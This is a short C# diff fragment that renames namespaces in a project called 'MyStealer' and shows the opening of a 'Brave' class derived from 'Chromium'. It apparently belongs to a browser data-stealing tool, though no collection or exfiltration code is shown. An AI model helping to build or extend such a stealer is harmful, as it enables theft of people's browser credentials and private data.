@@ -1,7 +1,8 @@
 ﻿using System.IO;
 using System;
+using MyStealer.Collectors.Browser;
 
-namespace MyStealer.Modules.Browser.ChromiumBased
+namespace MyStealer.Collectors.Browser.ChromiumBased
 {
     internal class Brave : Chromium
     {
